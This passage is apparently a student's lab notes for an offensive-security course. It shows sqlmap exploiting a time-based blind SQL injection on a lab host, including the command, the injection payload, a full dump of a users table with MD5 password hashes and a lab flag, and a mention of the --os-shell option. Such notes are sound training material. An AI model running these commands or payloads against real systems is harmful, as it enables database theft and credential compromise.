+*We submitted the entire URL after the -u specifier together with the ?user parameter set to a dummy value. Once launched, we can press I on the default options. Sqlmap then returns confirmation that we are dealing with a time-based blind SQL injection and provides additional fingerprinting information such as the web server operating system, web application technology stack, and the backend database.*
+
+- We can also dump the DB table and steal creds with sqlmap.
+ - *Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.*.
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:29:06 /2023-09-01/
+
+[08:29:07] [INFO] resuming back-end DBMS 'mysql' 
+[08:29:07] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://192.168.209.19/login1.php?msg=2'. Do you want to follow? [Y/n] 
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=tdgkom9olin...iqhjvdg3er'). Do you want to use those [Y/n] 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: user (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=1' AND (SELECT 5276 FROM (SELECT(SLEEP(5)))EDkh) AND 'UGNi'='UGNi
+---
+[08:29:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52, PHP
+back-end DBMS: MySQL >= 5.0.12
+[08:29:10] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[08:29:10] [INFO] fetching current database
+[08:29:10] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+[08:31:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[08:31:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[08:31:47] [INFO] adjusting time delay to 1 second due to good response times
+offsec
+[08:32:28] [INFO] fetching tables for database: 'offsec'
+[08:32:28] [INFO] fetching number of tables for database 'offsec'
+[08:32:28] [INFO] retrieved: 2
+[08:32:33] [INFO] retrieved: cu
+[08:33:02] [ERROR] invalid character detected. retrying..
+[08:33:02] [WARNING] increasing time delay to 2 seconds
+stomers
+[08:34:43] [INFO] retrieved: users
+[08:35:53] [INFO] fetching columns for table 'users' in database 'offsec'
+[08:35:53] [INFO] retrieved: 4
+[08:35:59] [INFO] retrieved: id
+[08:36:29] [INFO] retrieved: username
+[08:38:12] [INFO] retrieved: password
+[08:40:15] [INFO] retrieved: description
+[08:42:55] [INFO] fetching entries for table 'users' in database 'offsec'
+[08:42:55] [INFO] fetching number of entries for table 'users' in database 'offsec'
+[08:42:55] [INFO] retrieved: 4
+[08:43:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+this is the a
+[08:46:46] [ERROR] invalid character detected. retrying..
+[08:46:46] [WARNING] increasing time delay to 3 seconds
+dmin
+[08:48:06] [INFO] retrieved: 1
+[08:48:21] [INFO] retrieved: 21232f297a57a5a743894a0e4a8
+[09:00:21] [ERROR] invalid character detected. retrying..
+[09:00:21] [WARNING] increasing time delay to 4 seconds
+01f
+[09:02:01] [ERROR] invalid character detected. retrying..
+[09:02:01] [WARNING] increasing time delay to 5 seconds
+c3
+[09:02:55] [INFO] retrieved: admin
+[09:05:38] [ERROR] invalid character detected. retrying..
+[09:05:38] [WARNING] increasing time delay to 6 seconds
+
+[09:05:39] [INFO] retrieved: tr
+[09:07:59] [ERROR] invalid character detected. retrying..
+[09:07:59] [WARNING] increasing time delay to 7 seconds
+y harder
+[09:13:54] [INFO] retrieved: 2
+[09:14:39] [INFO] retrieved: f9664ea1803311b35f8
+[09:29:16] [ERROR] invalid character detected. retrying..
+[09:29:16] [WARNING] increasing time delay to 8 seconds
+1d07d
+[09:35:46] [ERROR] invalid character detected. retrying..
+[09:35:46] [WARNING] increasing time delay to 9 seconds
+8c9e072d
+[09:45:43] [INFO] retrieved: offse
+[09:51:18] [ERROR] invalid character detected. retrying..
+[09:51:18] [WARNING] increasing time delay to 10 seconds
+c
+[09:52:00] [INFO] retrieved: OS{31c7e8bfd1b1
+[10:08:16] [ERROR] invalid character detected. retrying..
+[10:08:16] [WARNING] increasing time delay to 11 seconds
+742d11d
+[10:16:17] [ERROR] invalid character detected. retrying..
+[10:16:17] [WARNING] increasing time delay to 12 seconds
+6aee90b4d64f
+[10:34:24] [ERROR] invalid character detected. retrying..
+[10:34:24] [WARNING] increasing time delay to 13 seconds
+5}
+[10:38:50] [INFO] retrieved: 3
+[10:40:10] [INFO] retrieved: 5f
+[10:45:04] [ERROR] invalid character detected. retrying..
+[10:45:04] [WARNING] increasing time delay to 14 seconds
+4dc
+[10:50:22] [ERROR] invalid character detected. retrying..
+[10:50:22] [WARNING] increasing time delay to 15 seconds
+c3b5
+[10:59:01] [ERROR] invalid character detected. retrying..
+[10:59:01] [WARNING] increasing time delay to 16 seconds
+[11:00:36] [ERROR] invalid character detected. retrying..
+[11:00:36] [WARNING] increasing time delay to 17 seconds
+[11:02:17] [ERROR] invalid character detected. retrying..
+[11:02:17] [WARNING] increasing time delay to 18 seconds
+[11:04:05] [ERROR] invalid character detected. retrying..
+[11:04:05] [WARNING] increasing time delay to 19 seconds
+[11:05:58] [ERROR] invalid character detected. retrying..
+[11:05:58] [WARNING] increasing time delay to 20 seconds
+[11:07:58] [ERROR] unable to properly validate last character value ('l')..
+la76
+[11:08:34] [ERROR] invalid character detected. retrying..
+[11:08:34] [WARNING] increasing time delay to 2 seconds
+5
+[11:09:09] [ERROR] invalid character detected. retrying..
+[11:09:09] [WARNING] increasing time delay to 3 seconds
+[11:09:42] [ERROR] invalid character detected. retrying..
+[11:09:42] [WARNING] increasing time delay to 4 seconds
+[11:10:30] [ERROR] invalid character detected. retrying..
+[11:10:30] [WARNING] increasing time delay to 5 seconds
+d6
+[11:12:17] [ERROR] invalid character detected. retrying..
+[11:12:17] [WARNING] increasing time delay to 6 seconds
+1d8327deb882cf99
+[11:23:02] [INFO] retrieved: bob
+[11:25:55] [ERROR] invalid character detected. retrying..
+[11:25:55] [WARNING] increasing time delay to 7 seconds
+a
+[11:26:12] [INFO] retrieved: pew pew
+[11:33:16] [INFO] retrieved: 4
+[11:34:15] [INFO] retrieved: 5653c6b1f51852a
+[11:46:31] [ERROR] invalid character detected. retrying..
+[11:46:31] [WARNING] increasing time delay to 8 seconds
+6351
+[11:51:18] [ERROR] invalid character detected. retrying..
+[11:51:18] [WARNING] increasing time delay to 9 seconds
+ec69c84
+[12:00:23] [ERROR] invalid character detected. retrying..
+[12:00:23] [WARNING] increasing time delay to 10 seconds
+52abc6
+[12:06:35] [INFO] retrieved: han
+[12:10:03] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[12:12:06] [INFO] writing hashes to a temporary file '/tmp/sqlmap693di119196158/sqlmaphashes-v4ipb5cf.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: offsec
+Table: users
+[4 entries]
++----+----------------------------------+----------+--------------------------------------+
+| id | password                         | username | description                          |
++----+----------------------------------+----------+--------------------------------------+
+| 1  | 21232f297a57a5a743894a0e4a801fc3 | admin    | this is the admin                    |
+| 2  | f9664ea1803311b35f81d07d8c9e072d | offsec   | try harder                           |
+| 3  | 5f4dcc3b5la765d61d8327deb882cf99 | boba     | OS{31c7e8bfd1b1742d11d6aee90b4d64f5} |
+| 4  | 5653c6b1f51852a6351ec69c8452abc6 | han      | pew pew                              |
++----+----------------------------------+----------+--------------------------------------+
+
+[12:12:12] [INFO] table 'offsec.users' dumped to CSV file '/home/operator/.local/share/sqlmap/output/192.168.209.19/dump/offsec/users.csv'
+
+```
+
+- *This is an extremely time consuming and noisy process when dealing with time-base blind SQLi, but it is effective.*.
+- Since this is a blind SQLi vuln, fetching the entire DB is slow.
+ - Once complete we will have all of the users MD5 hashed creds!
+
+- Sqlmap also offers the `--os-shell` param.
+ - Provides interactive shell.
+
